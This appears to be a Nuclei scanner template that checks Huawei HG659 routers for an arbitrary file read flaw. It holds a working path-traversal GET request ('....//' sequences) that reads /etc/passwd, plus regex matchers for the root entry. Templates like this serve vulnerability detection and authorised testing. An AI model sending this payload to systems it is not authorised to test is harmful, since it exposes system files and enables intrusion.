id: huawei-hg659-readfile
info:
  name: Huawei HG659 Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    This template detects an arbitrary file read vulnerability in Huawei HG659 routers by attempting to access the /etc/passwd file.
http:
  - raw:
      - |
        GET /lib///....//....//....//....//....//....//....//....//etc//passwd HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:[x*]:0:0:"
    extractors:
      - type: regex
        regex:
          - "root:[x*]:0:0:[^:]*:/bin/bash"
